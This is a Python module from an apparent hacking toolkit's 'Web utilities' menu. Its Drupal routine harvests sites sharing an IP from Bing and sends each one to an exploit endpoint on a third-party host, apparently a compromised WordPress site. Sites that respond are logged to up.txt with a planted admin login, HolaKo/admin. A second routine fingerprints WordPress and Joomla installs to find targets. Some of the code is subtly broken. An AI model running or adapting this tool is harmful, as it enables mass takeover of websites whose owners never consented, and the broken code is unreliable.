# region: outer menu operations
menu_name = "Web utilities"
menu_items = [
    "Drupal hacking",
    "Wordpress and Joomla scanner",
    "Gravity form scanner",
    "File upload checker",
    "Wordpress exploit scanner",
    "Wordpress plugins scanner",
    "Shell and directory finder",
    "Joomla! remote code execution",
    "Vbulletin remote code execution",
    "Arachni - Web Application Security Scanner Framework",
    "Private web f-scanner"
]

menu_items.append("Back")
# endregion

# region: additonal imports
import re
import sys
import urllib.request

from colorama import Fore
from urllib.request import Request, urlopen
from urllib.parse import quote_plus, urlparse
# endregion

# region: class helpers
def safe_print(ctx, text):
    try:
        p = ctx.get("print")
        if p:
            p(text)
        else:
            print(text)
    except Exception:
        print(text)

def safe_input(prompt, ctx):
    input_color = None
    try:
        input_color = ctx.get("input_color")
    except Exception:
        input_color = None

    if not input_color:
        input_color = Fore.LIGHTBLACK_EX
    colored_prompt = f"{input_color}{prompt}"

    try:
        return input(colored_prompt)
    except Exception:
        return input(prompt)
# endregion

# region: override class: drupal
class Drupal:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Drupal: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nDrupal options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting Bing exploiter session.\n")

        try:
            import requests
        except Exception:
            safe_print(ctx, "[!] The 'requests' library is required. Install with: pip install requests")
            return

        page = 1
        ip = safe_input("[!] IP or domain: ", ctx).strip()

        if not ip:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        user = "HolaKo"
        pwd = "admin"

        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36"}

        while page <= 50:
            try:
                encoded_ip = quote_plus(ip)
                url = ("https://www.bing.com/search?q=ip%3A{ip}"
                    "&go=Valider&qs=n&form=QBRE&pq=ip%3A{ip}&sc=0-0&sp=-1&sk=&first={page}"
                    ).format(ip=encoded_ip, page=page)

                safe_print(ctx, f"[*] Requesting page {page} ...")
                r = requests.get(url, headers=headers, timeout=10)

                if r.status_code != 200:
                    safe_print(ctx, f"[!] Bing returned status {r.status_code} for page {page}")
                    page += 1

                    continue

                html = r.text

                hrefs = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)
                candidates = [h for h in hrefs if "bing.com" not in h and "microsoft" not in h][:200]

                if not candidates:
                    candidates = re.findall(r'<div class="b_title"><h2><a href="(http[s]?://[^"]+)"', html, flags=re.I)

                safe_print(ctx, f"[*] Found {len(candidates)} candidate links on page {page}")

                for found in candidates:
                    try:
                        urlpa = urlparse(found)
                        site = urlpa.netloc

                        if not site:
                            continue

                        safe_print(ctx, f"[+] Testing at {site}")

                        encoded_site = quote_plus(site)
                        exploit_url = f"http://crig-alda.ro/wp-admin/css/index2.php?url={encoded_site}&submit=submit"

                        try:
                            r2 = requests.get(exploit_url, headers=headers, timeout=10)
                        except Exception as e_req:
                            safe_print(ctx, f"[!] Request to exploit URL failed for {site}: {e_req}")
                            continue

                        body = r2.text

                        if "User: HolaKo" in body:
                            safe_print(ctx, f"[!] Exploit found => {site}")
                            safe_print(ctx, f"user:{user} pass:{pwd}")

                            with open('up.txt', 'a', encoding='utf-8') as a:
                                a.write(site + '\n')
                                a.write("user:" + user + "\npass:" + pwd + "\n")
                        else:
                            safe_print(ctx, f"[-] Exploit not found at {site}")

                    except Exception as ex_inner:
                        safe_print(ctx, f"[!] Error testing candidate {found}: {ex_inner}")
                        continue
            except Exception as ex:
                safe_print(ctx, f"[!] Error on page {page}: {ex}")

            page += 10

        safe_print(ctx, "[*] Bing exploiter run finished.")
# endregion

# region: override class: wppjmla
class Wppjmla:
    menu_items = [
        "Run interactive",
        "Back"
    ]
        
    def __init__(self, ctx=None):
        self.ctx = ctx or {}

    def run(self, ctx):
        self.ctx = ctx
        safe_print(ctx, f"[*] Wppjmla: selected '{ctx.get('item')}'")
        self.sub_menu(ctx)

    def sub_menu(self, ctx):
        safe_print(ctx, "\nWppjmla options:")
        for i, it in enumerate(self.menu_items, 1):
            safe_print(ctx, f"  [{i}] {it}")
        safe_print(ctx, "")
            
        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
        
        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
            self.__init__()

        idx = int(choice) - 1
        sel = self.menu_items[idx]

        if sel.lower() == "back":
            return

        if "interactive" in sel:
            self.run_interactive(ctx)

    def _ensure_trailing_slash(url: str) -> str:
        return url if url.endswith('/') else url + '/'

    def bing_all_grabber(self, ip):
        seen = set()
        results = []

        offset = 1
        headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        while offset <= 101:
            try:
                q = quote_plus(ip)

                bing_url = ("https://www.bing.com/search?q=ip%3A{q}""&count=50&first={offset}").format(q=q, offset=offset)
                req = Request(bing_url, headers=headers)

                with urlopen(req, timeout=10) as resp:
                    html = resp.read().decode("utf-8", errors="ignore")

                links = re.findall(r'<h2>.*?<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I|re.S)
                if not links:
                    links = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)

                for link in links:
                    try:
                        p = urlparse(link)
                        host = p.netloc

                        if not host:
                            continue

                        if host.startswith("www."):
                            normalized = f"http://{host}/"
                        else:
                            normalized = f"http://www.{host}/"

                        if normalized not in seen:
                            seen.add(normalized)
                            results.append(normalized)
                    except Exception:
                        continue
            except Exception as e:
                pass

            offset += 50
        return results
    
    def check_wordpress(self, sites, timeout=10, headers=None):
        if headers is None:
            headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        results = []
        try:
            import requests
            use_requests = True
        except Exception:
            use_requests = False

        for site in sites:
            try:
                base = self._ensure_trailing_slash(site.strip())
                url = base + "wp-login.php"

                if use_requests:
                    resp = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    if resp.status_code == 200:
                        results.append(site)
                else:
                    req = Request(url, headers=headers)
                    with urlopen(req, timeout=timeout) as r:
                        code = getattr(r, "getcode", lambda: None)()
                        if code == 200:
                            results.append(site)
            except Exception:
                continue

        return results

    def check_joomla(self, sites, timeout=10, headers=None):
        if headers is None:
            headers = {"User-Agent": "Mozilla/5.0 (compatible)"}

        results = []
        try:
            import requests
            use_requests = True
        except Exception:
            use_requests = False

        for site in sites:
            try:
                base = self._ensure_trailing_slash(site.strip())
                url = base + "administrator"

                if use_requests:
                    resp = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    if resp.status_code == 200:
                        results.append(site)
                else:
                    req = Request(url, headers=headers)
                    with urlopen(req, timeout=timeout) as r:
                        code = getattr(r, "getcode", lambda: None)()
                        if code == 200:
                            results.append(site)
            except Exception:
                continue

        return results

    def run_interactive(self, ctx):
        safe_print(ctx, "\n[*] Starting wppjmla session.\n")

        target_ip = safe_input("Enter Target IP: ", ctx).strip()
        if not target_ip:
            safe_print(ctx, "[!] No input provided — aborting.")
            return

        try:
            sites = self.bing_all_grabber(target_ip)
        except Exception as e:
            safe_print(ctx, f"[!] Error grabbing sites: {e}")
            return

        try:
            wordpress_sites = self.check_wordpress(sites)
        except Exception as e:
            safe_print(ctx, f"[!] Error checking WordPress sites: {e}")
            wordpress_sites = []

        try:
            joomla_sites = self.check_joomla(sites)
        except Exception as e:
            safe_print(ctx, f"[!] Error checking Joomla sites: {e}")
            joomla_sites = []

        if wordpress_sites:
            safe_print(ctx, "\n[+] Found WordPress websites:")
            for wp in wordpress_sites:
                safe_print(ctx, f"  {wp}")
            safe_print(ctx, f"[+] Total WordPress sites: {len(wordpress_sites)}")
        else:
            safe_print(ctx, "[-] No WordPress sites found.")

        safe_print(ctx, "\n" + "-" * 30 + "\n")

        if joomla_sites:
            safe_print(ctx, "[+] Found Joomla websites:")
            for jm in joomla_sites:
                safe_print(ctx, f"  {jm}")
            safe_print(ctx, f"[+] Total Joomla sites: {len(joomla_sites)}")
        else:
            safe_print(ctx, "[-] No Joomla sites found.")

        safe_print(ctx, "\n[*] Wppjmla session finished.\n")
# endregion

# region: actions utility
def run_action(action, ctx):
    if isinstance(action, type):
        inst = action(ctx)
        
        if hasattr(inst, "run"):
            return inst.run(ctx)
        
        elif callable(inst):
            return inst(ctx)
        
    if hasattr(action, "run") and callable(getattr(action, "run")):
        return action.run(ctx)
    
    if callable(action):
        return action(ctx)

    raise TypeError("Action is not runnable")
# endregion

# region: executable function
def execute(ctx):
    item = ctx.get("item")

    fprint = ctx.get("print", lambda t: safe_print(ctx, t))
    wprint = ctx.get("warn", lambda t: safe_print(ctx, t))

    fprint(f"[*] Executing: {item}")
    actions = {
        "Drupal hacking": Drupal,
        "Wordpress and Joomla scanner": Wppjmla,
        #"Gravity form scanner",
        #"File upload checker",
        #"Wordpress exploit scanner",
        #"Wordpress plugins scanner",
        #"Shell and directory finder",
        #"Joomla! remote code execution",
        #"Vbulletin remote code execution",
        #"Arachni - Web Application Security Scanner Framework",
        #"Private web f-scanner"
    }

    action = actions.get(item)

    if not action:
        wprint(f"[!] Unknown action: {item}")
        return

    try:
        run_action(action, ctx)
    except Exception as e:
        wprint(f"[!] Error running action '{item}': {e}")
# endregion